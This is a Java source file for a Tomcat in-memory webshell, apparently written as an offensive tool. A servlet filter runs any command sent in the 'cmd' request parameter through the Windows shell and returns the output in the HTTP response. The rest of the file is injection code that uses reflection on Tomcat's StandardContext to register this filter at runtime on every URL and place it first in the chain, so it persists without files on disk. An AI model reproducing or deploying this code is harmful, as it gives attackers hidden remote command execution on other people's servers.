package x;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.logging.Logger;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import org.apache.catalina.Context;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

/**
 * @author fengyue
 * @date 2021-02-19
 */
public class SimpleFilter implements Filter {

  public static Logger log = Logger.getLogger(x.SimpleFilter.class.toString());

  public static final String FILTE_NAME = "SimpleFilter";

  private String pwd;
  private String path;

  @Override
  public void init(FilterConfig filterConfig) throws ServletException {
    System.out.println("SimpleFilter init");
    log.fine("SimpleFilter init");
  }

  @Override
  public void doFilter(ServletRequest req, ServletResponse resp,
      FilterChain chain) throws IOException, ServletException {
    System.out.println("webshell call doFilter");
    String cmder = req.getParameter("cmd");

    if (cmder != null && cmder.length() > 0) {
      // String[] cmd = new String[]{"/bin/sh", "-c", cmder};
      String[] cmd = new String[]{"cmd", "/c", cmder};
      try {
        Process ps = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream()));
        StringBuffer sb = new StringBuffer();
        String line;
        while ((line = br.readLine()) != null) {
          //执行结果加上回车
          sb.append(line).append("<br>");
        }
        String result = sb.toString();
        System.out.println("执行命令结果:" + result);
        resp.setContentType("text/html");
        resp.getWriter().write(result);

        // chain.doFilter(req, resp);
      } catch (Exception e) {
        // System.out.println("error:" + e.toString());
        log.severe("执行命令出错:" + e.toString());
      }
    } else {
      chain.doFilter(req, resp);
    }
  }

  @Override
  public void destroy() {

  }

  @Override
  public boolean equals(Object object) {
    Request request = (Request) object;
    Response response = request.getResponse();
    this.pwd = request.getParameter("p");
    this.path = request.getParameter("path");
    ServletContext servletContext = request.getServletContext();
    if (this.pwd != null && this.path != null && servletContext != null) {
      dynamicAddFilter(servletContext);
    } else {
      System.out.println("inject filter failed");
    }
    return true;
  }

  public void dynamicAddFilter(ServletContext servletContext) {
    System.out.println("dynamic add filter");
    StandardContext standardContext = null;
    try {
      Field field = servletContext.getClass().getDeclaredField("context");
      field.setAccessible(true);
      // Object o=field.get(servletContext);
      // if (o instanceof javax.servlet.ServletContext) {
      //   System.out.println("servlet的context对象为属于javax.servlet.ServletContext");
      // } else if (o instanceof org.apache.catalina.core.StandardContext) {
      //   System.out.println("servlet的context对象为属于javax.servlet.StandardContext");
      // }else{
      //   System.out.println("servlet的context对象未知");
      // }

      for (; standardContext == null; ) {
        java.lang.reflect.Field contextField = servletContext.getClass()
            .getDeclaredField("context");
        contextField.setAccessible(true);
        Object o = contextField.get(servletContext);

        if (o instanceof javax.servlet.ServletContext) {
          servletContext = (javax.servlet.ServletContext) o;
          System.out.println("servlet的context对象为属于javax.servlet.ServletContext");
        } else if (o instanceof org.apache.catalina.core.StandardContext) {
          standardContext = (org.apache.catalina.core.StandardContext) o;
          System.out.println("servlet的context对象为属于javax.servlet.StandardContext");
        }
      }
      // 获取servletContext的context成员 类型为ApplicationContext
      // ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);
      // field = applicationContext.getClass().getDeclaredField("context");
      // field.setAccessible(true);
      // // 获取ApplicationContext applicationContext的context成员 类型为StandardContext
      // standardContext = (StandardContext) field.get(applicationContext);
      // standardContext.getClass()获取到的class:org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext
      // field = standardContext.getClass().getDeclaredField("filterConfigs");
      System.out
          .println("standardContext.getClass()获取到的class:" + standardContext.getClass().getName());
      field = StandardContext.class.getDeclaredField("filterConfigs");
      field.setAccessible(true);
      // 获取standardContext的filterConfigs 如下定义
      /**
       * The set of filter configurations (and associated filter instances) we
       * have initialized, keyed by filter name.
       */
      // private HashMap<String, ApplicationFilterConfig> filterConfigs =
      //         new HashMap<>();
      HashMap filterConfigs = (HashMap) field.get(standardContext);
      if (filterConfigs.containsKey(FILTE_NAME)) {
        // System.out.println("SimpleFilter");
        System.out.println("已经存在" + FILTE_NAME + " 内存shell");
        return;
      }

      FilterDef filterDef = new FilterDef();
      filterDef.setFilterName(FILTE_NAME);
      standardContext.addFilterDef(filterDef);

      filterDef.setFilter(this);

      // 获取ApplicationFilterConfig的filterDef构造方法
      Constructor constructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig")
          .getDeclaredConstructor(Context.class, FilterDef.class);
      constructor.setAccessible(true);
      filterConfigs.put("SimpleFilter", constructor.newInstance(standardContext, filterDef));
    } catch (NoSuchFieldException e) {
      e.printStackTrace();
    } catch (IllegalAccessException e) {
      e.printStackTrace();
    } catch (NoSuchMethodException e) {
      e.printStackTrace();
    } catch (ClassNotFoundException e) {
      e.printStackTrace();
    } catch (InstantiationException e) {
      e.printStackTrace();
    } catch (InvocationTargetException e) {
      e.printStackTrace();
    }

    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName(FILTE_NAME);
    standardContext.addFilterMapBefore(filterMap);
    System.out.println("inject filter " + FILTE_NAME + " ok");
  }


  public void dynamicAddFilter2(ServletContext servletContext) {
    System.out.println("add dynamic Add Filter2");
    org.apache.catalina.core.StandardContext standardContext = null;
    //判断是否已有该名字的filter，有则不再添加
    try {
      if (servletContext.getFilterRegistration(FILTE_NAME) == null) {
        //遍历出标准上下文对象
        for (; standardContext == null; ) {
          Field contextField = servletContext.getClass()
              .getDeclaredField("context");
          contextField.setAccessible(true);
          Object o = contextField.get(servletContext);
          if (o instanceof ServletContext) {
            servletContext = (ServletContext) o;
          } else if (o instanceof StandardContext) {
            standardContext = (StandardContext) o;
          }
        }
        if (standardContext != null) {
          //修改状态，要不然添加不了
          Field stateField = org.apache.catalina.util.LifecycleBase.class
              .getDeclaredField("state");
          stateField.setAccessible(true);
          stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
          //创建一个自定义的Filter马
          // Filter threedr3am = new TomcatShellInject();
          //添加filter马
          javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext
              .addFilter(FILTE_NAME, this);
          filterRegistration.setInitParameter("encoding", "utf-8");
          filterRegistration.setAsyncSupported(false);
          filterRegistration
              .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST),
                  false,
                  new String[]{"/*"});
          //状态恢复，要不然服务不可用
          if (stateField != null) {
            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
          }

          if (standardContext != null) {
            //生效filter
            java.lang.reflect.Method filterStartMethod = StandardContext.class
                .getMethod("filterStart");
            filterStartMethod.setAccessible(true);
            filterStartMethod.invoke(standardContext, null);

            //把filter插到第一位
            FilterMap[] filterMaps = standardContext
                .findFilterMaps();
            for (int i = 0; i < filterMaps.length; i++) {
              if (filterMaps[i].getFilterName().equalsIgnoreCase(FILTE_NAME)) {
                FilterMap filterMap = filterMaps[i];
                filterMaps[i] = filterMaps[0];
                filterMaps[0] = filterMap;
                break;
              }
            }
          }
        }


      }
    } catch (NoSuchFieldException e) {
      e.printStackTrace();
    } catch (IllegalAccessException e) {
      e.printStackTrace();
    } catch (NoSuchMethodException e) {
      e.printStackTrace();
    } catch (InvocationTargetException e) {
      e.printStackTrace();
    }
  }
}
